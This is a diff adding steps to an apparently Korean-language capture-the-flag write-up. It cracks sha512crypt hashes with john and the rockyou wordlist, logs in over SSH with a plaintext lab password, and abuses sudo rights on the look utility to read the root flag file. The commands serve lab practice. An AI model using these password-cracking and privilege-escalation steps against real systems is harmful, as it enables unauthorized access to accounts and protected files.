@@ -808,3 +808,14 @@ apt install wordlists
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
+
+# 안 나옴! 다시 접근해서 root 확인 -> GTOF
+
+```bash
+sshpass -p 'josemario.AKA(think)' ssh think@10.10.67.138
+LFILE=/root/root.txt
+sudo /usr/bin/look '' "$LFILE"
+
+[sudo] password for think:
+5a285a9f257e45c68bb6c9f9f57d18e8
+```
